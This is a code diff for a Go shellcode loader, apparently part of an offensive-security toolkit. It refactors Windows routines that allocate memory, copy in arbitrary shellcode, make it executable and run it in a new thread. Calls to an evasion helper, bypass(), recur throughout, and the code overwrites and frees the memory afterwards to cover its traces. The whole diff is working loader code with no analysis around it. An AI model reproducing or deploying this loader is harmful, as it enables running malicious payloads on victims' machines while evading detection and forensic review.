@@ -13,25 +13,20 @@ import (
 
 // https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
 const (
-	memCommit  = uintptr(0x1000)
-	memReserve = uintptr(0x2000)
-	memRelease = uintptr(0x8000)
+	memCommit  = 0x1000
+	memReserve = 0x2000
+	memRelease = 0x8000
 
-	pageReadWrite        = uintptr(0x04)
-	pageExecute          = uintptr(0x10)
-	pageExecuteReadWrite = uintptr(0x40)
+	pageReadWrite        = 0x04
+	pageExecute          = 0x10
+	pageExecuteReadWrite = 0x40
 
-	infinite = uintptr(0xFFFFFFFF)
+	infinite = 0xFFFFFFFF
 )
 
 var (
-	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
-
-	procVirtualAlloc        = modKernel32.NewProc("VirtualAlloc")
-	procVirtualProtect      = modKernel32.NewProc("VirtualProtect")
-	procCreateThread        = modKernel32.NewProc("CreateThread")
-	procWaitForSingleObject = modKernel32.NewProc("WaitForSingleObject")
-	procVirtualFree         = modKernel32.NewProc("VirtualFree")
+	modKernel32      = windows.NewLazySystemDLL("kernel32.dll")
+	procCreateThread = modKernel32.NewProc("CreateThread")
 )
 
 // Execute is used to execute shellcode, default method is VirtualProtect,.
@@ -59,19 +54,18 @@ func VirtualProtect(shellcode []byte) error {
 
 	// allocate memory and copy shellcode
 	bypass()
-	memAddr, _, err := procVirtualAlloc.Call(0, uintptr(l), memReserve|memCommit, pageReadWrite)
-	if memAddr == 0 {
+	memAddr, err := windows.VirtualAlloc(0, uintptr(l), memReserve|memCommit, pageReadWrite)
+	if err != nil {
 		return errors.WithStack(err)
 	}
 	copyShellcode(memAddr, shellcode)
 
-	var run uintptr
-	runPtr := uintptr(unsafe.Pointer(&run)) // #nosec
+	old := new(uint32)
 
 	// set execute
 	bypass()
-	ok, _, err := procVirtualProtect.Call(memAddr, uintptr(l), pageExecute, runPtr)
-	if ok == 0 {
+	err = windows.VirtualProtect(memAddr, uintptr(l), pageExecute, old)
+	if err != nil {
 		return errors.WithStack(err)
 	}
 	// execute shellcode
@@ -80,14 +74,14 @@ func VirtualProtect(shellcode []byte) error {
 	if threadAddr == 0 {
 		return errors.WithStack(err)
 	}
-	// wait
+	// wait execute finish
 	bypass()
-	_, _, _ = procWaitForSingleObject.Call(threadAddr, infinite)
+	_, _ = windows.WaitForSingleObject(windows.Handle(threadAddr), infinite)
 
 	// set read write
 	bypass()
-	ok, _, err = procVirtualProtect.Call(memAddr, uintptr(l), pageReadWrite, runPtr)
-	if ok == 0 {
+	err = windows.VirtualProtect(memAddr, uintptr(l), pageReadWrite, old)
+	if err != nil {
 		return errors.WithStack(err)
 	}
 	// cover shellcode and free allocated memory
@@ -108,8 +102,8 @@ func CreateThread(shellcode []byte) error {
 
 	// allocate memory and copy shellcode
 	bypass()
-	memAddr, _, err := procVirtualAlloc.Call(0, uintptr(l), memReserve|memCommit, pageExecuteReadWrite)
-	if memAddr == 0 {
+	memAddr, err := windows.VirtualAlloc(0, uintptr(l), memReserve|memCommit, pageExecuteReadWrite)
+	if err != nil {
 		return errors.WithStack(err)
 	}
 	copyShellcode(memAddr, shellcode)
@@ -120,9 +114,9 @@ func CreateThread(shellcode []byte) error {
 	if threadAddr == 0 {
 		return errors.WithStack(err)
 	}
-	// wait
+	// wait execute finish
 	bypass()
-	_, _, _ = procWaitForSingleObject.Call(threadAddr, infinite)
+	_, _ = windows.WaitForSingleObject(windows.Handle(threadAddr), infinite)
 
 	// cover shellcode and free allocated memory
 	covertAllocatedMemory(memAddr, l)
@@ -161,5 +155,5 @@ func covertAllocatedMemory(memAddr uintptr, l int) {
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
 		*b = byte(rand.Int64())
 	}
-	_, _, _ = procVirtualFree.Call(memAddr, 0, memRelease)
+	_ = windows.VirtualFree(memAddr, 0, memRelease)
 }
